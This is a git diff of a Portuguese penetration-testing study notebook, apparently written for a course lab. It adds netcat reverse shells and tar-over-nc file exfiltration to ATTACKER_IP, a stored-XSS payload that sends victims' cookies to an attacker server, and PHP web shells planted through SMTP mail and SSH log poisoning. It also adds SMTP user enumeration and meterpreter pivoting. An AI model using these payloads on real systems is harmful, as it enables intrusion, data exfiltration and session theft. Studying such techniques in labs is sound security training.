@@ -2,7 +2,7 @@
 
 
 
-# http
+# http (80)
 - http 1.1 requer Host no header
 ## aspx
 
@@ -262,7 +262,7 @@ Para excluir basta utilizar o comando
 net use Z: /delete
 ```
 
-# rpc (Remote Procedure Call)  135/tcp
+# Remote Procedure Call - RPC  (135/tcp)
 O RPC é uma API que permite a um programa executar um procedimento (ou função) em outro espaço de endereço, como em um servidor remoto, como se fosse uma chamada local
 conectando ao servidor com usuário e senha
 ```
@@ -340,43 +340,87 @@ PASS
 Comandos úteis:
 1. TOP \[message index\] \[num lines to return\]
 
-# SMTP
+# SMTP (25)
 O SMTP (Simple Mail Transfer Protocol) é um protocolo de comunicação utilizado para enviar e transferir e-mails entre servidores de e-mail e clientes.
-**porta default: 25**
+- **SMTP enumeration** https://www.geeksforgeeks.org/smtp-enumeration/
+enumeração de hosts
 ```
-nc -v <ip> <porta>
+use auxiliary/scanner/smtp/smtp_enum 
+set RHOSTS <IP>
+set rport <PORT>
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
+run
 ```
 
-ex de resposta quando o usuário existe
+```
+telnet [IP] [PORT]
+```
+
+exemplo de resposta quando o usuário existe
 ```
 EHLO root
 250 2.1.5 OK
-```
 
-ex de resposta quando o usuário não existe
-```
-EHLO jhayson
-550 5.1.1 User unknown
-```
-
-ex de resposta quando o usuário existe
-```
 VRFY root
 250 2.1.5 OK
-```
 
-```
 VRFY www-data
 250 2.1.5 OK
 ```
 
-ex de resposta quando o usuário não existe
+exemplo de resposta quando o usuário não existe
 ```
-VRFY jhayson
+EHLO jhayson
 550 5.1.1 User unknown
+
+VRFY asdasasdasdasdas
+550 5.1.1 User unknown
+
+VRFY www-kasdjas
+550 5.1.1 <www-dasdasda>: Recipient address rejected: User unknown in local recipient table
 ```
 
+
 obs: podemos enviar um email para um determinador usuário para enumerar se o usuário em questão existe ou não. De acordo com a resposta recebida podemos definir se o usuário existe ou não.
+
+path do postfix `/var/spool/mail/www-data`
+
+
+diretorios de email smtp
+```
+/var/mail/USER
+/var/spool/mail/USER
+/var/mail/www-data
+/var/spool/mail/www-data
+```
+
+**RCE via smtp**
+```
+telnet 172.30.0.128 25
+Trying 172.30.0.128...
+Connected to 172.30.0.128.
+Escape character is '^]'.
+MAIL FROM:romio
+RCPT220 ubuntu.bloi.com.br ESMTP Postfix (Ubuntu)
+ 250 2.1.0 Ok
+RCPT TO:www-data@ubuntu.local   
+502 5.5.2 Error: command not recognized
+MAIL FROM:romio
+503 5.5.1 Error: nested MAIL command
+RCPT TO:www-data@ubuntu.local
+250 2.1.5 Ok
+data 
+354 End data with <CR><LF>.<CR><LF>
+<?php echo system($_GET['hack']);?>
+.
+250 2.0.0 Ok: queued as 23781C007F
+
+
+# requisição
+http://172.30.0.128/supportdesk/index.php?page=/var/mail/www-data&hack=whoami
+
+```
+
 
 # Enumerando Dispositivos de Rede
 porta default: 23
@@ -393,10 +437,19 @@ conexão com o servidor
 telnet <ip> <porta>
 ```
 
-# ssh (secure shell)
+# ssh (22/2222/22222 TCP)
 Permite conexão de shell remota
 Portas default: 22, 2222, 22222
 
+Conexão
+```
+ssh user@IP
+```
+
+**arquivo de configuração**
+```
+/etc/ssh/sshd_config
+```
 Estrutura comum de um diretório `.ssh`:
 ```
 ~/.ssh/
@@ -468,7 +521,12 @@ PermitRootLogin yes
 ```
 https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/6/html/v2v_guide/preparation_before_the_p2v_migration-enable_root_login_over_ssh
 
+### erro de negociacao
+Unable to negotiate with 172.16.1.177 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss
 
+```
+ssh -o HostkeyAlgorithms=+ssh-rsa USER@IP
+```
 # SNMP
 Protocolo para gerenciamento de dispostivos de rede, encontrado em switchs, roteadores e servidores.
 porta default: 161 (UDP)
@@ -1315,6 +1373,28 @@ searchsploit ipfire --id -m <exploit_ID>
 
 # web
 
+## reverse shell
+```
+nc ATACKER_IP OPENNED_PORT -c bash
+nc ATACKER_IP OPENNED_PORT -e /bin/bash
+```
+- `-e` Essa opção foi **removida** em versões mais recentes do `netcat`, como a do OpenBSD (`netcat-traditional` não tem `-e
+- `-c` Essa opção só existe em algumas versões do `netcat` (como a GNU Netcat), mas não funciona no OpenBSD `netcat`
+### envio de multiplos arquivos
+atacante
+```
+nc -lvp 1234 | tar xvf -
+```
+opção 1 - escolhendo os arquivos a serem enviados:
+servidor
+```
+tar cf - arquivo1.txt arquivo2.txt | nc ATTACKER_IP 1234
+```
+
+opção 2 - enviando a pasta toda
+```
+tar cf - minha_pasta | nc ATTACKER_IP 1234
+```
 
 ## SQL
 **comandos SQL**
@@ -1509,6 +1589,42 @@ path com wordlists com payloads de LFI
 /usr/share/seclists/Fuzzing/LFI/
 ```
 
+diretorios de email smtp
+```
+/var/mail/USER
+/var/spool/mail/USER
+/var/mail/www-data
+/var/spool/mail/www-data
+```
+
+RCE via smtp
+```
+telnet 172.30.0.128 25
+Trying 172.30.0.128...
+Connected to 172.30.0.128.
+Escape character is '^]'.
+MAIL FROM:romio
+RCPT220 ubuntu.bloi.com.br ESMTP Postfix (Ubuntu)
+ 250 2.1.0 Ok
+RCPT TO:www-data@ubuntu.local   
+502 5.5.2 Error: command not recognized
+MAIL FROM:romio
+503 5.5.1 Error: nested MAIL command
+RCPT TO:www-data@ubuntu.local
+250 2.1.5 Ok
+data 
+354 End data with <CR><LF>.<CR><LF>
+<?php echo system($_GET['hack']);?>
+.
+250 2.0.0 Ok: queued as 23781C007F
+
+
+# requisição
+http://172.30.0.128/supportdesk/index.php?page=/var/mail/www-data&hack=whoami
+
+```
+
+
 ## XSS
 ferramenta para automatizar teste de XSS
 ```
@@ -1523,9 +1639,20 @@ payloads: https://github.com/payloadbox/xss-payload-list
 
 
 ### self
+exibe o proprio cookie
+```
+<script>alert(document.cookie)</script>
+```
+redefine o proprio cookie
+```
+<script>alert(document.cookie="PHPSESSID=3u23181nqsq4q02u1n42pk9vq7")</script>
+```
 
 ### stored
-
+captura o cookie de quem acessou a página com stored XSS e envia para o nosso servidor
+```
+<script> new Image().src="http://IP:PORT/?="+document.cookie;</script>
+```
 
 
 ## command injection
@@ -1574,7 +1701,11 @@ view-source:http://rh.businesscorp.com.br/index.php?page=data://text/plain;base6
 ```
 joomscan -u URL
 ```
-
+## .htaccess
+indica para interpretar arquivos `.sec` como `.php`
+```
+AddType application/x-httpd-php .sec
+```
 ## phpmailer
 
 ## wordpress
@@ -1695,6 +1826,32 @@ path para themes, `wp-content/themes/classic/404.php`
 ```
 http://37.59.174.231/blog/wp-content/themes/classic/404.php?desec=ls%20-la%20/
 ```
+## log poisoning (ssh/apache/mail)
+arquivos de log
+```
+# ssh
+var/log/auth.log
+
+# apache2
+/var/log/apache2/error.log
+/var/log/apache2/access.log
+```
+
+obs: no caso do ssh, ele não permite o envio de caracteres especiais, então então envie o payload via nc e isso vai gerar um log
+```
+ nc -v 172.16.1.177 22                 
+172.16.1.177 [172.16.1.177] 22 (ssh) open
+SSH-2.0-OpenSSH_5.5p1 Debian-6+squeeze5
+<?php system($_GET["hack"]);?>
+Protocol mismatch.
+
+
+GET /lfi.php?file=/var/log/auth.log&hack=ls+-la
+```
+
+
+
+https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/
 
 ## OWASP
 livro
@@ -2018,12 +2175,46 @@ script para scan automatizado
 
 
 ## Pivoting
-falta fazer
-rh.business
+https://www.offsec.com/metasploit-unleashed/pivoting/
+**pivoting via meterpreter**
+```
+route
+run autoroute -s 10.10.20.0/24
+```
+tunelamento
+```
+portfwd add -l [LOCAL_PORT] -p [HOST_PORT] -r [HOST_REMOTO]
+
+portfwd add -l 110 -p 110 -r 10.10.20.4
+
+```
+
+pivoting via proxychains
+1. usar o módulo auxiliar `auxiliary/server/socks4a`
+2. configurar a mesma porta do módulo auxiliar no proxychains `/etc/proxychains.conf` `socks4 127.0.0.1 [PORT]`
+
+obs: a conexão via pivoting é mais lenta, evite scanners com muitas portas.
+
+
+# relatório
+salvar os comandos do terminal e suas respectivas saidas
+```
+script [FILE_NAME]
+comando1
+comando2
+
+exit
+```
+
 # dever de casa
-comprometer os hosts 
-172.30.0.15
-172.30.0.20
-172.30.0.30
-172.30.0.40
-172.30.0.200
+1. comprometer os hosts 
+
+	172.30.0.15
+	172.30.0.20
+	172.30.0.30
+	172.30.0.40
+	172.30.0.200
+
+
+2. testar pivoting no rh.business
+3. 
